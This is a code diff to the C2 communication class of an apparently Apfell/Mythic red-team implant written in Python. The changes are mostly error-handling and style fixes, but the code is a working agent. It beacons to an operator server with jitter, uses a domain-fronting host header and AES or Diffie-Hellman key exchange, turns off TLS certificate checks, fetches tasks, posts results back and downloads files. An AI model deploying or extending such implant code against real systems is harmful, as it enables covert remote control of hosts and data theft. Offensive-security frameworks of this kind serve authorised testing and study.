@@ -20,12 +20,12 @@ class C2():
         self.jitter = 20  # this is a percentage
         self.timeout = 20  # used for doing timeouts for web connections
         self.EKE = True if "encrypted_exchange_check" == "T" else False
-        self.aes_encryption_key = "AESPSK" if len("AESPSK") > 6 else ""
+        self.aes_encryption_key = "AESPSK" if "AESPSK" != "" else ""
         self.chunk_size = 1024 * 1000 * 5  # 5MB chunks
         self.encryption = False
         self.host_header = "domain_front" if len("domain_front") > 0 else ""
         # adjust the checkin URI based on what we're tyring to do
-        if self.EKE == True:
+        if self.EKE:
             self.checkin_uri = "EKE_DH_NEW_CALLBACK"
             self.encryption = True
             self.clientPub = DiffieHellman()
@@ -129,12 +129,15 @@ class C2():
             cipher_initial_message = self.encrypt_apfell_message(initial_message)
             req = self.urllib2.Request(self.url_base + self.get_post_new_callback_EKE_psk_aes_path(apfell.UUID), cipher_initial_message, headers=self.headers)
             response = None
-            while response == None:
+            while response is None:
                 try:
                     response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                     the_page = response.read()
+                    if len(the_page) == 0:
+                        print(response.info())
+                        raise Exception("got 0 length response back")
                 except Exception as e:
-                    print("Failed to connect")
+                    print("failed to connect in checkin: {}".format(str(e)))
                     self.wait()
                     continue
                 try:
@@ -148,12 +151,15 @@ class C2():
                     message = self.encrypt_apfell_message(userdata)
                     req = self.urllib2.Request(self.url_base + self.get_post_new_callback_EKE_psk_aes_path(session_id), message,  headers=self.headers)
                     response = None
-                    while response == None:
+                    while response is None:
                         try:
                             response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                             the_page = response.read()
+                            if len(the_page) == 0:
+                                print(response.info())
+                                raise Exception("got 0 length response back")
                         except Exception as e:
-                            print("Failed to connect")
+                            print("failed to connect in second part of checkin: {}".format(str(e)))
                             self.wait()
                             continue
                         try:
@@ -162,21 +168,24 @@ class C2():
                             data = self.json.loads(plaintext)
                             self.id = data['id']
                         except Exception as e:
-                            print(e)
+                            print("failed to connect in second part of checkin: {}".format(str(e)))
                             raise e
                 except Exception as e:
-                    print(e)
+                    print("error in checkin main while loop: {}".format(str(e)))
                     raise e
         elif self.aes_encryption_key != "":
             message = self.encrypt_apfell_message(userdata)
-            req = self.urllib2.Request(self.url_base + self.get_post_new_callback_aes_psk_path(apfell.UUID), message,  headers=self.headers)
+            req = self.urllib2.Request(self.url_base + self.get_post_new_callback_aes_psk_path(), message,  headers=self.headers)
             response = None
-            while response == None:
+            while response is None:
                 try:
                     response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                     the_page = response.read()
+                    if len(the_page) == 0:
+                        print(response.info())
+                        raise Exception("got 0 length response back")
                 except Exception as e:
-                    print("Failed to connect")
+                    print("error in aes checkin: {}".format(str(e)))
                     self.wait()
                     continue
                 try:
@@ -191,12 +200,15 @@ class C2():
             # this means just do normal access
             req = self.urllib2.Request(self.url_base + self.get_post_new_callback_path(), userdata,  headers=self.headers)
             response = None
-            while response == None:
+            while response is None:
                 try:
                     response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                     the_page = response.read()
+                    if len(the_page) == 0:
+                        print(response.info())
+                        raise Exception("got 0 length response back")
                 except Exception as e:
-                    print("Failed to connect")
+                    print(str(e))
                     self.wait()
                     continue
                 try:
@@ -209,12 +221,15 @@ class C2():
     def get_task(self):
         req = self.urllib2.Request(self.url_base + self.get_next_task_path(self.id),  headers=self.headers)
         response = None
-        while response == None:
+        while response is None:
             try:
                 response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                 the_page = response.read()
+                if len(the_page) == 0:
+                    print(response.info())
+                    raise Exception("got 0 length response back")
             except Exception as e:
-                print("Failed to connect in get_task")
+                print("Failed to connect in get_task: {}".format(str(e)))
                 self.wait()
                 continue
             try:
@@ -227,20 +242,23 @@ class C2():
                 print(e)
                 raise e
 
-    def post_response(self, response="", task_id=-1):
-        userdata = self.json.dumps({"response": self.base64.b64encode(response.encode()).decode('utf-8')})
+    def post_response(self, response, task_id=-1):
+        userdata = self.json.dumps({"response": self.base64.b64encode(response.encode('utf-8')).decode('utf-8')})
         if self.encryption:
             message = self.encrypt_apfell_message(userdata)
         else:
             message = userdata
         req = self.urllib2.Request(self.url_base + self.get_post_response_path(task_id), message,  headers=self.headers)
         response = None
-        while response == None:
+        while response is None:
             try:
                 response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                 the_page = response.read()
+                if len(the_page) == 0:
+                    print(response.info())
+                    raise Exception("got 0 length response back")
             except Exception as e:
-                print("Failed to connect in post_response")
+                print("Failed to connect in post_response: {}".format(str(e)))
                 self.wait()
                 continue
             try:
@@ -270,12 +288,15 @@ class C2():
         # get something from the server to write to disk
         req = self.urllib2.Request(self.url_base + self.get_file_path(file_id, self.id),  headers=self.headers)
         response = None
-        while response == None:
+        while response is None:
             try:
                 response = self.urllib2.urlopen(req, timeout=self.timeout, context=self.ssl._create_unverified_context())
                 the_page = response.read()
+                if len(the_page) == 0:
+                    print(response.info())
+                    raise Exception("got 0 length response back")
             except Exception as e:
-                print("Failed to connect in upload")
+                print("Failed to connect in upload: {}".format(str(e)))
                 self.wait()
                 continue
             try:
